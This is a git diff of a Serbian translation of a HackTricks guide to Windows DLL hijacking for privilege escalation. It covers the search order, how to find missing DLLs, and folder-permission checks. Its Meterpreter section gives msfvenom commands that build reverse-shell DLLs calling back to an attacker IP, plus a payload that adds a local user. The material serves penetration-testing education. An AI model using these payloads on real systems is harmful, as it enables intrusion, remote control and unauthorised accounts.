@@ -6,107 +6,110 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika_).
+**Savet za bug bounty**: **prijavite se** na **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Osnovne informacije
 
-DLL Hijacking uključuje manipulaciju pouzdanom aplikacijom tako da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection i Side-Loading**. Glavna svrha je izvršavanje koda, postizanje postojanosti i, ređe, eskalacija privilegija. Bez obzira na fokus na eskalaciji privilegija, metoda hakovanja ostaje ista za sve ciljeve.
+DLL Hijacking uključuje manipulisanje pouzdane aplikacije da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika poput **DLL Spoofing-a, Injection-a i Side-Loading-a**. Glavno je korišćenje za izvršavanje koda, postizanje postojanosti i, ređe, eskalaciju privilegija. Bez obzira na fokus na eskalaciji ovde, metoda preuzimanja ostaje konzistentna u svim ciljevima.
 
-### Uobičajene tehnike
+### Česte tehnike
 
-Za DLL hakovanje koristi se nekoliko metoda, pri čemu je njihova efikasnost zavisna od strategije učitavanja DLL-a aplikacije:
+Postoje nekoliko metoda za DLL preuzimanje, pri čemu je efikasnost svake zavisi od strategije učitavanja DLL-a aplikacije:
 
-1. **Zamena DLL-a**: Zamena originalnog DLL-a zlonamernim, opciono korišćenje DLL Proxying-a da bi se očuvala funkcionalnost originalnog DLL-a.
-2. **DLL Search Order Hakovanje**: Postavljanje zlonamernog DLL-a na putanju pre legitimnog, iskorišćavanje obrasca pretrage aplikacije.
-3. **Phantom DLL Hakovanje**: Kreiranje zlonamernog DLL-a koji će aplikacija pokušati da učita, misleći da je to nepostojeći DLL koji je potreban.
-4. **DLL Redirekcija**: Modifikacija parametara pretrage kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi kako bi se aplikacija usmerila na zlonamerni DLL.
-5. **WinSxS Zamena DLL-a**: Zamena legitimnog DLL-a zlonamernim ekvivalentom u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading-om.
-6. **Hakovanje DLL-a sa relativnom putanjom**: Postavljanje zlonamernog DLL-a u direktorijum koji je pod kontrolom korisnika zajedno sa kopiranom aplikacijom, slično tehnikama izvršavanja binarnih fajlova putem proxy-ja.
+1. **Zamena DLL-a**: Zamena originalnog DLL-a zlonamernim, opciono korišćenjem DLL Proxying-a da bi se sačuvala funkcionalnost originalnog DLL-a.
+2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorišćavajući šablon pretrage aplikacije.
+3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za učitavanje od strane aplikacije, misleći da je to nepostojeći potreban DLL.
+4. **DLL Redirection**: Modifikovanje parametara pretrage poput `%PATH%` ili `.exe.manifest` / `.exe.local` fajlova da bi se aplikacija usmerila na zlonamerni DLL.
+5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading-om.
+6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum koji kontroliše korisnik sa kopiranom aplikacijom, podsećajući na tehnike Binary Proxy Execution.
 
-## Pronalaženje nedostajućih DLL-ova
+## Pronalaženje nedostajućih Dll-ova
 
-Najčešći način pronalaženja nedostajućih DLL-ova u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) alata iz sysinternals-a, **postavljanje** sledećih **2 filtera**:
+Najčešći način pronalaženja nedostajućih Dll-ova unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **postavljanjem** sledećih **2 filtera**:
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-i prikazivanje samo **aktivnosti sistema datoteka**:
+i prikazivanje **File System Activity**:
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-Ako tražite **nedostajuće DLL-ove uopšteno**, ostavite ovo pokrenuto nekoliko **sekundi**.\
-Ako tražite **nedostajući DLL unutar određene izvršne datoteke**, trebali biste postaviti **još jedan filter kao "Process Name" "contains" "\<ime izvršne datoteke>", pokrenuti je i zaustaviti snimanje događaja**.
+Ako tražite **nedostajuće dll-ove uopšte** ostavite ovo pokrenuto nekoliko **sekundi**.\
+Ako tražite **nedostajući dll unutar određene izvršne datoteke** trebalo bi da postavite **drugi filter kao "Process Name" "contains" "\<ime izvršne datoteke>", izvršite je, i zaustavite snimanje događaja**.
 
-## Iskorišćavanje nedostajućih DLL-ova
+## Iskorišćavanje nedostajućih Dll-ova
 
-Da bismo eskalirali privilegije, najbolja šansa je da **napišemo DLL koji će privilegovani proces pokušati da učita** na nekom mestu gde će biti pretražen. Na taj način, moći ćemo da **napišemo** DLL u **folderu** gde se **DLL pretražuje pre** foldera u kojem se nalazi **originalni DLL** (neobičan slučaj), ili ćemo moći da **pišemo u neki folder gde će DLL biti pretražen** a originalni **DLL ne postoji** ni u jednom folderu.
+Da bismo eskalirali privilegije, najbolja šansa je da možemo **napisati dll koji će privilegovani proces pokušati da učita** na nekom mestu gde će biti pretražen. Zbog toga ćemo moći **napisati** dll u **folderu** gde će se **dll pretraživati pre** foldera gde se nalazi **originalni dll** (čudan slučaj), ili ćemo moći **pisati u nekom folderu gde će se tražiti dll** a originalni **dll ne postoji** ni u jednom folderu.
 
 ### Redosled pretrage DLL-a
 
-U [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) možete pronaći kako se DLL-ovi specifično učitavaju.
+**Unutar** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi učitavaju specifično.**
 
-**Windows aplikacije** traže DLL-ove prateći određeni set **unapred definisanih putanja pretrage**, pridržavajući se određenog redosleda. Problem hakovanja DLL-a nastaje kada se zlonamerni DLL strategijski postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je da se obezbedi da aplikacija koristi apsolutne putanje kada se referiše na DLL-ove koje zahteva.
+**Windows aplikacije** traže DLL-ove prateći set **unapred definisanih putanja pretrage**, pridržavajući se određenog redosleda. Problem sa DLL preuzimanjem nastaje kada se štetan DLL strategijski postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je osigurati da aplikacija koristi apsolutne putanje kada se odnosi na DLL-ove koje zahteva.
 
-Možete videti **redosled pretrage DLL-a na 32-bitnim** sistemima u nastavku:
+Možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima ispod:
 
-1. Direktorijum iz kojeg je aplikacija učitana.
-2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma. (_C:\Windows\System32_)
-3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobija putanju do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
-4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma. (_C:\Windows_)
+1. Direktorijum iz kog je aplikacija učitana.
+2. Sistemski direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
+3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
+4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da biste dobili putanju ovog direktorijuma.
+1. (_C:\Windows_)
 5. Trenutni direktorijum.
-6. Direktorijumi navedeni u PATH okruženjskoj promenljivoj. Napomena: ovo ne uključuje putanju specifičnu za aplikaciju koja je navedena u registarskom ključu **App Paths**. Ključ **App Paths** se ne koristi prilikom računanja putanje pretrage DLL-a.
+6. Direktorijumi navedeni u PATH okruženjskoj promenljivoj. Napomena: ovo ne uključuje putanju po aplikaciji navedenu ključem **App Paths** u registru. Ključ **App Paths** se ne koristi prilikom računanja putanje pretrage DLL-a.
 
-To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**-om. Kada je on onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).
+To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**-om. Kada je on onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registarsku vrednost i postavite je na 0 (podrazumevano je omogućeno).
 
-Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, pretraga počinje u direktorijumu izvršnog modula koji učitava **LoadLibraryEx**.
+Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) poziva sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** pretraga počinje u direktorijumu izvršne modula koji **LoadLibraryEx** učitava.
 
-Na kraju, napomenimo da **DLL može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju, taj DLL će biti
-#### Izuzeci u redosledu pretrage DLL fajlova prema Windows dokumentaciji
+Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju, taj dll će se **tražiti samo na toj putanji** (ako dll ima bilo kakve zavisnosti, biće tražene samo po imenu koje je učitano).
+
+Postoje i drugi načini za izmenu redosleda pretrage, ali ih ovde neću objašnjavati.
+#### Izuzeci u redosledu pretrage dll fajlova prema Windows dokumentaciji
 
 Određeni izuzeci od standardnog redosleda pretrage DLL fajlova su navedeni u Windows dokumentaciji:
 
-- Kada se naiđe na **DLL fajl koji deli ime sa već učitanom DLL fajlom u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši se provera preusmeravanja i manifesta pre nego što se podrazumevano koristi DLL fajl koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL fajlom**.
-- U slučajevima kada se DLL fajl prepoznaje kao **poznata DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznate DLL, zajedno sa svim zavisnim DLL fajlovima, **preskačući proces pretrage**. Ključ registra **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL fajlova.
-- Ukoliko DLL fajl ima **zavisnosti**, pretraga za ovim zavisnim DLL fajlovima se vrši kao da su naznačeni samo njihovi **nazivi modula**, bez obzira na to da li je početni DLL fajl identifikovan putanjom.
+* Kada se naiđe na **DLL fajl koji deli ime sa već učitanim fajlom u memoriji**, sistem preskače uobičajenu pretragu. Umesto toga, vrši proveru preusmerenja i manifesta pre nego što se podrazumevano vrati na već učitan DLL fajl. **U ovom scenariju, sistem ne vrši pretragu za DLL fajlom**.
+* U slučajevima kada se DLL prepozna kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL fajla, zajedno sa svim zavisnim DLL fajlovima, **preskačući proces pretrage**. Ključ registra **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL fajlova.
+* Ukoliko **DLL fajl ima zavisnosti**, pretraga za ovim zavisnim DLL fajlovima se vrši kao da su naznačeni samo njihovi **nazivi modula**, bez obzira na to da li je početni DLL identifikovan putanjom.
 
 ### Eskalacija privilegija
 
-**Uslovi**:
+**Zahtevi**:
 
-- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), a koji **nedostaje DLL fajl**.
-- Osigurajte da postoji **pristup za pisanje** u bilo kojem **direktorijumu** u kojem će se **tražiti DLL fajl**. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar putanje sistema.
+* Identifikovati proces koji funkcioniše ili će funkcionisati pod **različitim privilegijama** (horizontalno ili lateralno kretanje), koji **nedostaje DLL fajl**.
+* Osigurati da je **dostupan pristup pisanju** za bilo koju **direktorijum** u kojem će se **tražiti DLL**. Ova lokacija može biti direktorijum izvršne datoteke ili direktorijum unutar sistemskog puta.
 
-Da, uslovi su komplikovani za pronalaženje jer je **podrazumevano prilično čudno da privilegovan izvršni fajl nedostaje DLL fajl** i još je **čudnije imati dozvole za pisanje u folderu putanje sistema** (što nije moguće podrazumevano). Ali, u neskonfigurisanim okruženjima ovo je moguće.\
-U slučaju da imate sreće i ispunjavate uslove, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta zaobilaženje UAC-a**, tamo možete pronaći **PoC** za hakovanje DLL fajlova za odgovarajuću verziju Windows-a (verovatno samo promenom putanje foldera u kojem imate dozvole za pisanje).
+Da, zahtevi su komplikovani za pronaći jer je **podrazumevano prilično čudno pronaći privilegovanu izvršnu datoteku koja nedostaje DLL fajl** i još je **čudnije imati dozvole za pisanje u folderu sistema** (to nije moguće podrazumevano). Međutim, u neskonfigurisanim okruženjima ovo je moguće.\
+U slučaju da imate sreće i ispunjavate zahteve, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta zaobilazak UAC-a**, tamo možete pronaći **PoC** za Dll preusmeravanje za Windows verziju koju možete koristiti (verovatno samo promenom putanje foldera u kojem imate dozvole za pisanje).
 
 Imajte na umu da možete **proveriti svoje dozvole u folderu** koristeći:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-I **proverite dozvole svih foldera unutar PATH**:
+I proverite dozvole svih fascikli unutar **PATH**-a:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Takođe možete proveriti uvoze izvršne datoteke i izvoze DLL datoteke pomoću:
+Takođe možete proveriti uvoze izvršne datoteke i izvoze DLL datoteke sa:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u **System Path folderu**, pogledajte:
+Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u **System Path folderu** pogledajte:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
@@ -114,25 +117,25 @@ Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privil
 
 ### Automatizovani alati
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kojem folderu unutar sistema PATH.\
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kom folderu unutar sistema PATH.\
 Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._
 
 ### Primer
 
-U slučaju da pronađete iskoristiv scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje bilo bi **kreiranje dll-a koji izvozi barem sve funkcije koje će izvršna datoteka uvoziti iz njega**. U svakom slučaju, napomenimo da Dll Hijacking dolazi u ruci kako bi se [eskaliro od nivoa srednje integriteta do visokog **(zaobilazeći UAC)**](../authentication-credentials-uac-and-efs.md#uac) ili od **visokog integriteta do SYSTEMA**. Možete pronaći primer **kako kreirati validan dll** u okviru ovog studija o dll hijackingu fokusiranom na izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Osim toga, u **narednom odeljku** možete pronaći neke **osnovne kodove dll-a** koji mogu biti korisni kao **predlošci** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.
+U slučaju da pronađete iskorišćiv scenarij, jedna od najvažnijih stvari za uspešno iskorišćavanje bilo bi **kreiranje dll-a koji izvozi barem sve funkcije koje će izvršna datoteka uvesti iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u ruci kako bi [eskaliro od srednjeg nivoa integriteta do visokog **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) ili od [**visokog integriteta do SYSTEM-a**](./#from-high-integrity-to-system)**.** Možete pronaći primer **kako kreirati validan dll** unutar ovog studija o dll hijackingu fokusiranom na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Osim toga, u **narednoj sekciji** možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **predlozi** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.
 
 ## **Kreiranje i kompajliranje Dll-ova**
 
 ### **Dll Proksifikacija**
 
-U osnovi, **Dll proxy** je Dll koji je sposoban da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali takođe i da **izlaže** i **radi** kao **očekivano** tako što **preusmerava sve pozive na pravu biblioteku**.
+U osnovi, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali takođe da **izloži** i **radi** kao **očekivano** prenoseći sve pozive pravoj biblioteci.
 
-Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti izvršnu datoteku i izabrati biblioteku** koju želite da proksifikujete i **generisati proksifikovani dll** ili **navesti Dll** i **generisati proksifikovani dll**.
+Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **označiti izvršnu datoteku i izabrati biblioteku** koju želite proksifikovati i **generisati proksifikovani dll** ili **označiti Dll** i **generisati proksifikovani dll**.
 
 ### **Meterpreter**
 
-**Dobijanje reverzne veze (x64):**
+**Get rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -140,13 +143,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Kreiranje korisnika (x86, nisam vidio x64 verziju):**
+**Napravite korisnika (x86 Nisam video x64 verziju):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Vaša sopstvena
+### Tvoj sopstveni
 
-Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje, **binarna datoteka neće moći da ih učita** i **eksploatacija će neuspeti**.
+Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje, **binarni fajl neće moći da ih učita** i **eksploatacija će neuspeti**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -228,14 +231,15 @@ return TRUE;
 }
 ```
 ## Reference
+
 * [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 * [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika, pisano i govorno_).
+**Savet za lov na bagove**: **prijavite se** na **Intigriti**, premium **platformu za lov na bagove kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
@@ -243,10 +247,10 @@ Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapošljava
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
